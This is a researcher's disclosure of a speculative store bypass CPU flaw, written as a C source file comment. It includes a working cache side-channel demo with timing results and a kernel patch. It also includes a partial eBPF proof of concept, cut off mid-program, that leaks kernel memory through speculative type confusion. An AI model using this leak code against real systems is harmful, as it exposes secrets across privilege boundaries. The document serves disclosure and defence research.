/*
======== Intro / Overview ========
After Michael Schwarz made some interesting observations, we started
looking into variants other than the three already-known ones.

I noticed that Intel's Optimization Manual says in
section 2.4.4.5 ("Memory Disambiguation"):

    A load instruction micro-op may depend on a preceding store. Many
    microarchitectures block loads until all preceding store address
    are known.
    The memory disambiguator predicts which loads will not depend on
    any previous stores. When the disambiguator predicts that a load
    does not have such a dependency, the load takes its data from the
    L1 data cache.
    Eventually, the prediction is verified. If an actual conflict is
    detected, the load and all succeeding instructions are re-executed.

According to my experiments, this effect can be used to cause
speculative execution to continue far enough to execute a
Spectre-style gadget on a pointer read from a memory slot to which a
store has been speculatively ignored. I have tested this behavior on
the following processors from Intel and AMD:

 - Intel(R) Core(TM) i7-6600U CPU @ 2.60GHz [Skylake laptop]
 - AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G [AMD desktop]
 - Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz [Haswell desktop]

I haven't yet tested this on any ARM CPU.

Interestingly, only on the Skylake laptop, it seems to work when
interrupts and SMP are disabled while the test is running; on the
other machines, it seems to only work when interrupts are enabled,
maybe because the kernel code cause some noise that garbles some
predictor state or so? Or just because they mess up timing
somewhere...


There were mentions of data speculation on the netdev list, in a
somewhat different context:

https://www.mail-archive.com/netdev@vger.kernel.org/msg212262.html
https://www.mail-archive.com/netdev@vger.kernel.org/msg215369.html

However, I'm not entirely sure about the terminology. Do
"data speculation" and "value speculation" include speculating about
the *source* of data, or do they refer exclusively to directly
speculating about the *value* of data?





======== Demo code (no privilege boundaries crossed) ========
This is some code that purely demonstrates the basic effect and shows
that it is possible to combine it with a Meltdown/Spectre-style
gadget for leaking data into the cache. It does not cross any
privilege boundaries.

-----------------------   START   -----------------------
// compile with: gcc -o test test.c -Wall -DHIT_THRESHOLD={CYCLES}
// optionally add: -DNO_INTERRUPTS

#include <stdio.h>
#include <sys/io.h>
#include <err.h>
#include <sys/mman.h>

#define pipeline_flush() asm volatile("mov $0,
%%eax\n\tcpuid\n\tlfence" : /*out*/ : /*in*/ :
"rax","rbx","rcx","rdx","memory")
#define clflush(addr) asm volatile("clflush (%0)"::"r"(addr):"memory")

// source of high-latency pointer to the memory slot
unsigned char **flushy_area[1000];
#define flushy (flushy_area+500)

// memory slot on which we want bad memory disambiguation
unsigned char *memory_slot_area[1000];
#define memory_slot (memory_slot_area+500)

//                                  0123456789abcdef
unsigned char secret_read_area[] = "0000011011101011";
unsigned char public_read_area[] = "################";

unsigned char timey_line_area[0x200000];
// stored in the memory slot first
#define timey_lines (timey_line_area + 0x10000)

unsigned char dummy_char_sink;

int testfun(int idx) {
  pipeline_flush();
  *flushy = memory_slot;
  *memory_slot = secret_read_area;
  timey_lines['0' << 12] = 1;
  timey_lines['1' << 12] = 1;
  pipeline_flush();
  clflush(flushy);
  clflush(&timey_lines['0' << 12]);
  clflush(&timey_lines['1' << 12]);
  asm volatile("mfence");
  pipeline_flush();

  // START OF CRITICAL PATH
  unsigned char **memory_slot__slowptr = *flushy;
  //pipeline_flush();
  // the following store will be speculatively ignored since its
address is unknown
  *memory_slot__slowptr = public_read_area;
  // uncomment the instructions in the next line to break the attack
  asm volatile("" /*"mov $0, %%eax\n\tcpuid\n\tlfence"*/ : /*out*/ :
/*in*/ : "rax","rbx","rcx","rdx","memory");
  // architectual read from dummy_timey_line, possible
microarchitectural read from timey_line
  dummy_char_sink = timey_lines[(*memory_slot)[idx] << 12];
  // END OF CRITICAL PATH

  unsigned int t1, t2;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '0')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_0 = t2 - t1;

  pipeline_flush();
  asm volatile(
    "lfence\n\t"
    "rdtscp\n\t"
    "mov %%eax, %%ebx\n\t"
    "mov (%%rdi), %%r11\n\t"
    "rdtscp\n\t"
    "lfence\n\t"
  ://out
    "=a"(t2),
    "=b"(t1)
  ://in
    "D"(timey_lines + 0x1000 * '1')
  ://clobber
    "r11",
    "rcx",
    "rdx",
    "memory"
  );
  pipeline_flush();
  unsigned int delay_1 = t2 - t1;

  if (delay_0 < HIT_THRESHOLD && delay_1 > HIT_THRESHOLD) {
    pipeline_flush();
    return 0;
  }
  if (delay_0 > HIT_THRESHOLD && delay_1 < HIT_THRESHOLD) {
    pipeline_flush();
    return 1;
  }
  pipeline_flush();
  return -1;
}

int main(void) {
  char out[100000];
  char *out_ = out;

#ifdef NO_INTERRUPTS
  if (mlockall(MCL_CURRENT|MCL_FUTURE) || iopl(3))
    err(1, "iopl(3)");
#endif

  for (int idx = 0; idx < 16; idx++) {
#ifdef NO_INTERRUPTS
    asm volatile("cli");
#endif
    pipeline_flush();
    long cycles = 0;
    int hits = 0;
    char results[33] = {0};
    /* if we don't break the loop after some time when it doesn't
work, in NO_INTERRUPTS mode with SMP disabled, the machine will lock
up */
    while (hits < 32 && cycles < 1000000) {
      pipeline_flush();
      int res = testfun(idx);
      if (res != -1) {
        pipeline_flush();
        results[hits] = res + '0';
        hits++;
      }
      cycles++;
      pipeline_flush();
    }
    pipeline_flush();
#ifdef NO_INTERRUPTS
    asm volatile("sti");
#endif
    out_ += sprintf(out_, "%c: %s in %ld cycles (hitrate: %f%%)\n",
secret_read_area[idx], results, cycles, 100*hits/(double)cycles);
  }
  printf("%s", out);
  pipeline_flush();
}
-----------------------    END    -----------------------


Results:

In the following, "SMP off" means that I have executed this
command:
# for file in /sys/devices/system/cpu/cpu*/online; do echo 0 > $file; done

For the Intel machines, "turbo off" means that I've executed the
following command:
# echo 1 > /sys/devices/system/cpu/intel_pstate/no_turbo

Skylake laptop, normal:

$ gcc -o test test.c -Wall -DHIT_THRESHOLD=50
$ ./test
0: 00000000000000000000000000000000 in 61944 cycles (hitrate: 0.051660%)
0: 00000000000000000000000000000000 in 36467 cycles (hitrate: 0.087751%)
0: 00000000000000000000000000000000 in 36788 cycles (hitrate: 0.086985%)
0: 00000000000000000000000000000000 in 36800 cycles (hitrate: 0.086957%)
0: 00000000000000000000000000000000 in 35797 cycles (hitrate: 0.089393%)
1: 11111111111111111111111111111111 in 48923 cycles (hitrate: 0.065409%)
1: 11111111111111111111111111111111 in 44525 cycles (hitrate: 0.071870%)
0: 00000000000000000000000000000000 in 44813 cycles (hitrate: 0.071408%)
1: 11111111111111111111111111111111 in 40625 cycles (hitrate: 0.078769%)
1: 11111111111111111111111111111111 in 40897 cycles (hitrate: 0.078245%)
1: 11111111111111111111111111111111 in 39648 cycles (hitrate: 0.080710%)
0: 00000000000000000000000000000000 in 40737 cycles (hitrate: 0.078553%)
1: 11111111111111111111111111111111 in 37850 cycles (hitrate: 0.084544%)
0: 00000000000000000000000000000000 in 46062 cycles (hitrate: 0.069472%)
1: 11111111111111111111111111111111 in 44929 cycles (hitrate: 0.071223%)
1: 11111111111111111111111111111111 in 37465 cycles (hitrate: 0.085413%)

Skylake laptop, SMP off, interrupts off, turbo off:

$ gcc -o test test.c -Wall -DHIT_THRESHOLD=50 -DNO_INTERRUPTS
$ sudo ./test
0: 00000000000000000000000000000000 in 34697 cycles (hitrate: 0.092227%)
0: 00000000000000000000000000000000 in 32625 cycles (hitrate: 0.098084%)
0: 00000000000000000000000000000000 in 32776 cycles (hitrate: 0.097632%)
0: 00000000000000000000000000000000 in 34680 cycles (hitrate: 0.092272%)
0: 00000000000000000000000000000000 in 32302 cycles (hitrate: 0.099065%)
1: 11111111111111111111111111111111 in 33240 cycles (hitrate: 0.096270%)
1: 11111111111111111111111111111111 in 33738 cycles (hitrate: 0.094849%)
0: 00000000000000000000000000000000 in 31745 cycles (hitrate: 0.100803%)
1: 11111111111111111111111111111111 in 31745 cycles (hitrate: 0.100803%)
1: 11111111111111111111111111111111 in 32531 cycles (hitrate: 0.098368%)
1: 11111111111111111111111111111111 in 31745 cycles (hitrate: 0.100803%)
0: 00000000000000000000000000000000 in 31745 cycles (hitrate: 0.100803%)
1: 11111111111111111111111111111111 in 31745 cycles (hitrate: 0.100803%)
0: 00000000000000000000000000000000 in 32193 cycles (hitrate: 0.099400%)
1: 11111111111111111111111111111111 in 32167 cycles (hitrate: 0.099481%)
1: 11111111111111111111111111111111 in 31745 cycles (hitrate: 0.100803%)

Haswell PC, normal:

$ gcc -o test test.c -Wall -DHIT_THRESHOLD=50
$ ./test
0: 00000000000000000000000000000000 in 119737 cycles (hitrate: 0.026725%)
0: 00000000000000000000000000000000 in 45340 cycles (hitrate: 0.070578%)
0: 00000000000000000000000000000000 in 39127 cycles (hitrate: 0.081785%)
0: 00000000000000000000000000000000 in 39567 cycles (hitrate: 0.080875%)
0: 00000000000000000000000000000000 in 35164 cycles (hitrate: 0.091002%)
1: 11111111111111111111111111111111 in 33770 cycles (hitrate: 0.094759%)
1: 11111111111111111111111111111111 in 36743 cycles (hitrate: 0.087091%)
0: 00000000000000000000000000000000 in 36749 cycles (hitrate: 0.087077%)
1: 11111111111111111111111111111111 in 35686 cycles (hitrate: 0.089671%)
1: 11111111111111111111111111111111 in 35843 cycles (hitrate: 0.089278%)
1: 11111111111111111111111111111111 in 35826 cycles (hitrate: 0.089321%)
0: 00000000000000000000000000000000 in 35302 cycles (hitrate: 0.090646%)
1: 11111111111111111111111111111111 in 34256 cycles (hitrate: 0.093414%)
0: 00000000000000000000000000000000 in 36604 cycles (hitrate: 0.087422%)
1: 11111111111111111111111111111111 in 36795 cycles (hitrate: 0.086968%)
1: 11111111111111111111111111111111 in 37820 cycles (hitrate: 0.084611%)

Haswell PC, SMP off, interrupts off, turbo off:

$ gcc -o test test.c -Wall -DHIT_THRESHOLD=50 -DNO_INTERRUPTS
$ sudo ./test
0: 00000000000000000000000000000000 in 32770 cycles (hitrate: 0.097650%)
0: 00000000000000000000000000000000 in 32776 cycles (hitrate: 0.097632%)
0: 00000000000000000000000000000000 in 32783 cycles (hitrate: 0.097612%)
0: 00000000000000000000000000000000 in 31745 cycles (hitrate: 0.100803%)
0: 00000000000000000000000000000000 in 37455 cycles (hitrate: 0.085436%)
1:  in 1000000 cycles (hitrate: 0.000000%)
1:  in 1000000 cycles (hitrate: 0.000000%)
0: 00000000000000000000000000000000 in 39894 cycles (hitrate: 0.080213%)
1:  in 1000000 cycles (hitrate: 0.000000%)
1:  in 1000000 cycles (hitrate: 0.000000%)
1: 11111111111111111111111111111111 in 33845 cycles (hitrate: 0.094549%)
0:  in 1000000 cycles (hitrate: 0.000000%)
1:  in 1000000 cycles (hitrate: 0.000000%)
0: 00000000000000000000000000000000 in 44050 cycles (hitrate: 0.072645%)
1:  in 1000000 cycles (hitrate: 0.000000%)
1:  in 1000000 cycles (hitrate: 0.000000%)

AMD desktop, normal:

$ gcc -o test test.c -Wall -DHIT_THRESHOLD=200 -std=gnu99
$ ./test
0: 0000000000000000000000000 in 1000000 cycles (hitrate: 0.002500%)
0: 000000000000000000000 in 1000000 cycles (hitrate: 0.002100%)
0: 00000000000000000000000000000000 in 939816 cycles (hitrate: 0.003405%)
0: 00000000000000000000000000000000 in 903838 cycles (hitrate: 0.003540%)
0: 00000000000000000000000000000000 in 360430 cycles (hitrate: 0.008878%)
1: 11111111111111111111111111111111 in 484242 cycles (hitrate: 0.006608%)
1: 11111111111111111111111111111111 in 331271 cycles (hitrate: 0.009660%)
0: 00000000000000000000000000000000 in 388049 cycles (hitrate: 0.008246%)
1: 11111111111111111111111111111111 in 282588 cycles (hitrate: 0.011324%)
1: 11111111111111111111111111111111 in 359558 cycles (hitrate: 0.008900%)
1: 11111111111111111111111111111111 in 359013 cycles (hitrate: 0.008913%)
0: 0000000000000000000000000000000 in 1000000 cycles (hitrate: 0.003100%)
1: 11111111111111111111111111111111 in 501067 cycles (hitrate: 0.006386%)
0: 00000000000000000000000000000000 in 312420 cycles (hitrate: 0.010243%)
1: 11111111111111111111111111111111 in 784663 cycles (hitrate: 0.004078%)
1: 11111111111111111111111111111111 in 954189 cycles (hitrate: 0.003354%)

AMD desktop, SMP off, interrupts off:

$ gcc -o test test.c -Wall -DHIT_THRESHOLD=200 -std=gnu99 -DNO_INTERRUPTS
$ sudo ./test
0: 00 in 1000000 cycles (hitrate: 0.000200%)
0: 00 in 1000000 cycles (hitrate: 0.000200%)
0: 00 in 1000000 cycles (hitrate: 0.000200%)
0: 00 in 1000000 cycles (hitrate: 0.000200%)
0: 00 in 1000000 cycles (hitrate: 0.000200%)
1: 11 in 1000000 cycles (hitrate: 0.000200%)
1: 11 in 1000000 cycles (hitrate: 0.000200%)
0: 00 in 1000000 cycles (hitrate: 0.000200%)
1: 11 in 1000000 cycles (hitrate: 0.000200%)
1: 11 in 1000000 cycles (hitrate: 0.000200%)
1: 11 in 1000000 cycles (hitrate: 0.000200%)
0: 00 in 1000000 cycles (hitrate: 0.000200%)
1:  in 1000000 cycles (hitrate: 0.000000%)
0: 00 in 1000000 cycles (hitrate: 0.000200%)
1: 11 in 1000000 cycles (hitrate: 0.000200%)
1: 11 in 1000000 cycles (hitrate: 0.000200%)





======== assisted BPF PoC ========
This is a PoC that demonstrates that this issue can potentially be
used to attack the Linux kernel's BPF subsystem.
This is *NOT* a full exploit against BPF; this is a PoC that requires
kernel patches that permit the PoC to flush kernel memory from inside
BPF and to measure access times to BPF arrays. It seems probable that
these restrictions could be overcome, but my PoC doesn't do that.

The basic idea here is to cause a speculative type confusion:

1. Store a number N at address A on the stack.
2. Write a pointer P to address A, using a high-latency
   expression to compute A.
3. Read a value X from address A, with A specified using a low-latency
   expression. Architecturally, X is P; however, microarchitecturally,
   X can be N.
4. Use the Spectre/Meltdown gadget to leak the value X points to into
   the cache.

The attack benefits from the unique property of eBPF that the engine
performs relatively complicated value tracking, but does not
normally use the resulting information to modify the code in any way
(e.g. by optimizing things away). It is not clear how applicable this
attack would be to e.g. other scripting languages, or whether it is an
issue for non-scripting code.

I have only tested this PoC on an Intel Skylake CPU.


Kernel patch required for the PoC to work (copy attached, so that it
applies cleanly), to be applied to the 4.15.1 stable kernel:

-----------------------   START   -----------------------
diff --git a/include/linux/bpf.h b/include/linux/bpf.h
index 0b25cf87b6d6..896b4f483fe2 100644
--- a/include/linux/bpf.h
+++ b/include/linux/bpf.h
@@ -591,6 +591,7 @@ extern const struct bpf_func_proto bpf_skb_vlan_push_proto;
 extern const struct bpf_func_proto bpf_skb_vlan_pop_proto;
 extern const struct bpf_func_proto bpf_get_stackid_proto;
 extern const struct bpf_func_proto bpf_sock_map_update_proto;
+extern const struct bpf_func_proto bpf_clflush_mfence_proto;

 /* Shared helpers among cBPF and eBPF. */
 void bpf_user_rnd_init_once(void);
diff --git a/kernel/bpf/helpers.c b/kernel/bpf/helpers.c
index 3d24e238221e..379dc888cb81 100644
--- a/kernel/bpf/helpers.c
+++ b/kernel/bpf/helpers.c
@@ -179,3 +179,17 @@ const struct bpf_func_proto bpf_get_current_comm_proto = {
        .arg1_type      = ARG_PTR_TO_UNINIT_MEM,
        .arg2_type      = ARG_CONST_SIZE,
 };
+
+BPF_CALL_1(bpf_clflush_mfence, void *, target) {
+       asm volatile("mfence\n\tclflush (%0)\n\tmfence"::"r"(target):"memory");
+       return 0;
+}
+
+const struct bpf_func_proto bpf_clflush_mfence_proto = {
+       .func = bpf_clflush_mfence,
+       .ret_type = RET_INTEGER,
+       /* theoretically permits CLFLUSH on invalid addresses,
+        * but the PoC doesn't do that
+        */
+       .arg1_type = ARG_DONTCARE
+};
diff --git a/kernel/bpf/syscall.c b/kernel/bpf/syscall.c
index 5cb783fc8224..2dd9a2a95630 100644
--- a/kernel/bpf/syscall.c
+++ b/kernel/bpf/syscall.c
@@ -605,6 +605,85 @@ static int map_lookup_elem(union bpf_attr *attr)
        return err;
 }

+static int map_time_flush_loc(union bpf_attr *attr)
+{
+       void __user *ukey = u64_to_user_ptr(attr->key);
+       void __user *uvalue = u64_to_user_ptr(attr->value);
+       int ufd = attr->map_fd;
+       struct bpf_map *map;
+       void *key, *ptr;
+       struct fd f;
+       int err = 0;
+       u64 delay = 0;
+
+       f = fdget(ufd);
+       map = __bpf_map_get(f);
+       if (IS_ERR(map))
+               return PTR_ERR(map);
+
+       if (!(f.file->f_mode & FMODE_CAN_READ)) {
+               err = -EPERM;
+               goto err_put;
+       }
+
+       if (map->map_type != BPF_MAP_TYPE_ARRAY) {
+               err = -EINVAL;
+               goto err_put;
+       }
+
+       if (attr->flags > 0x100000 || attr->flags >= map->value_size) {
+               err = -EINVAL;
+               goto err_put;
+       }
+       asm volatile("lfence");
+
+       key = memdup_user(ukey, map->key_size);
+       if (IS_ERR(key)) {
+               err = PTR_ERR(key);
+               goto err_put;
+       }
+
+       rcu_read_lock();
+       ptr = map->ops->map_lookup_elem(map, key);
+       if (ptr) {
+               unsigned int t1, t2;
+               ptr = (char*)ptr + attr->flags;
+               asm volatile(
+                 "xor %%r11, %%r11\n\t"
+                 "lfence\n\t"
+                 "rdtscp\n\t"
+                 "mov %%eax, %%ebx\n\t"
+                 "mov (%%rdi), %%r11b\n\t"
+                 "rdtscp\n\t"
+                 "mfence\n\t"
+                 "clflush (%%rdi)\n\t"
+                 "mfence\n\t"
+               ://out
+                 "=a"(t2),
+                 "=b"(t1)
+               ://in
+                 "D"(ptr)
+               ://clobber
+                 "r11",
+                 "rcx",
+                 "rdx",
+                 "memory"
+               );
+               delay = t2 - t1;
+       }
+       rcu_read_unlock();
+       if (copy_to_user(uvalue, &delay, 8)) {
+               err = -EINVAL;
+               goto free_key;
+       }
+
+free_key:
+       kfree(key);
+err_put:
+       fdput(f);
+       return err;
+}
+
 #define BPF_MAP_UPDATE_ELEM_LAST_FIELD flags

 static int map_update_elem(union bpf_attr *attr)
@@ -1713,6 +1792,9 @@ SYSCALL_DEFINE3(bpf, int, cmd, union bpf_attr
__user *, uattr, unsigned int, siz
        case BPF_MAP_UPDATE_ELEM:
                err = map_update_elem(&attr);
                break;
+       case 0x13370001:
+               err = map_time_flush_loc(&attr);
+               break;
        case BPF_MAP_DELETE_ELEM:
                err = map_delete_elem(&attr);
                break;
diff --git a/net/core/filter.c b/net/core/filter.c
index 1c0eb436671f..e310a345054c 100644
--- a/net/core/filter.c
+++ b/net/core/filter.c
@@ -3347,6 +3347,8 @@ bpf_base_func_proto(enum bpf_func_id func_id)
                return &bpf_tail_call_proto;
        case BPF_FUNC_ktime_get_ns:
                return &bpf_ktime_get_ns_proto;
+       case 4:
+               return &bpf_clflush_mfence_proto;
        case BPF_FUNC_trace_printk:
                if (capable(CAP_SYS_ADMIN))
                        return bpf_get_trace_printk_proto();
-----------------------    END    -----------------------


The PoC:

-----------------------   START   -----------------------
*/

#define _GNU_SOURCE
#include <pthread.h>
#include <assert.h>
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stddef.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/user.h>

#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))



/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })



int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

unsigned int array_time_flush_loc(int mapfd, uint32_t idx, uint32_t off) {
  uint64_t time;
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&idx,
    .value  = (uint64_t)&time,
    .flags  = off,
  };

  int res = bpf_(0x13370001, &attr);
  if (res)
    err(1, "map flush loc");
  return time;
}

void array_set_dw(int mapfd, uint32_t key, uint64_t value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem");
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 1,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  //printf("==========================\n%s==========================\n",
verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);

  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}

int input_map, leak_map;
int sockfds[16];

int leak_bit(unsigned long addr, int bit) {
  array_set_dw(input_map, 0, addr);
  int count_0 = 0, count_1 = 0;
  while (count_0 + count_1 < 100) {
    array_time_flush_loc(leak_map, 0, 2048+0x1000);
    trigger_proc(sockfds[bit+8]);
    unsigned int t1 = array_time_flush_loc(leak_map, 0, 2048+0x1000);

    array_time_flush_loc(leak_map, 0, 2048);
    trigger_proc(sockfds[bit+0]);
    unsigned int t0 = array_time_flush_loc(leak_map, 0, 2048);

    //printf("%u %u\n", t0, t1);
    if (t0 < 50)
      count_0++;
    if (t1 < 50)
      count_1++;
  }
  printf("%d vs %d\n", count_0, count_1);
  return (count_0 > count_1) ? 0 : 1;
}

int leak_byte(unsigned long addr) {
  int byte = 0;
  for (int bit=0; bit<8; bit++) {
    byte |= leak_bit(addr, bit)<<bit;
  }
  return byte;
}

int main(int argc, char **argv) {
  setbuf(stdout, NULL);
  input_map = array_create(8, 1);
  leak_map = array_create(0x3000, 1);

  if (argc != 3)
    errx(1, "invocation (expects addr and length)");

  #define BPF_REG_CONFUSED_SLOT BPF_REG_6
  #define BPF_REG_SLOW_SLOT BPF_REG_7
  #define BPF_REG_CONFUSED_SLOT_ALIAS BPF_REG_8
  #define BPF_REG_LEAK_ARRAY BPF_REG_9

  #define BPF_REG_CONFUSED BPF_REG_1
  #define BPF_REG_SECRET_VALUE BPF_REG_2
  #define BPF_REG_DUMMY_SLOT BPF_REG_3

  for (int i=0; i<16; i++) {
    bool dummy_ff = (i >= 8);
    int selected_bit = i & 7;
    struct bpf_insn insns[] = {
      /* setup: write 0x00 or 0xff to -216 to get a big stack
allocation and to prepare dummy */
      BPF_ST_MEM(BPF_B, BPF_REG_FP, -216, dummy_ff ? 0x00 : 0xff),

      /* setup: compute stack slot pointers to :
       * - type-confused stack slot (at -72)
       * - pointer to type-confused stack slot (at -144)
       */
      BPF_MOV64_REG(BPF_REG_CONFUSED_SLOT, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_CONFUSED_SLOT, -72),
      BPF_MOV64_REG(BPF_REG_SLOW_SLOT, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_SLOW_SLOT, -144),
      //BPF_MOV64_REG(BPF_REG_0, BPF_REG_FP),
      //BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, -216),

      /* write to dummy slot (to make a big stack and to permit later read) */
      //BPF_ST_MEM(BPF_DW, BPF_REG_0, 0, 0),

      /* setup: store victim memory pointer in BPF_REG_CONFUSED_SLOT */
      BPF_LD_MAP_FD(BPF_REG_ARG1, input_map),
      BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
      BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
      BPF_EXIT_INSN(),
      BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),
      BPF_STX_MEM(BPF_DW, BPF_REG_CONFUSED_SLOT, BPF_REG_0, 0),

      /* setup: spill pointer to type-confused stack slot */
      BPF_STX_MEM(BPF_DW, BPF_REG_SLOW_SLOT, BPF_REG_CONFUSED_SLOT, 0),

      /* setup: load pointer to leak area into register */
      BPF_LD_MAP_FD(BPF_REG_ARG1, leak_map),
      BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
      BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
      BPF_EXIT_INSN(),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 2048), /* leak_map+2048 */
      BPF_MOV64_REG(BPF_REG_LEAK_ARRAY, BPF_REG_0),

      /* CHEATED: fence and flush */
